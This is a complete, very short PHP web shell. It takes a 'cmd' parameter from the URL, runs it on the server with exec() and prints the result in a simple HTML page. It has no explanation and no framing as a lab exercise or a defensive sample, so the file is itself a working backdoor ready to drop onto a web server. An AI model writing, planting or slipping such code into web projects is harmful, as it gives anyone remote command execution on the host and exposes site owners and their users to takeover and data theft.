<?php
if(isset($_GET['cmd'])){
	$op = exec($_GET['cmd'],$output, $return_var);
	}
?>
<html>
	<body>
		<pre><?php print_r($output); ?></pre>
	</body>
</html>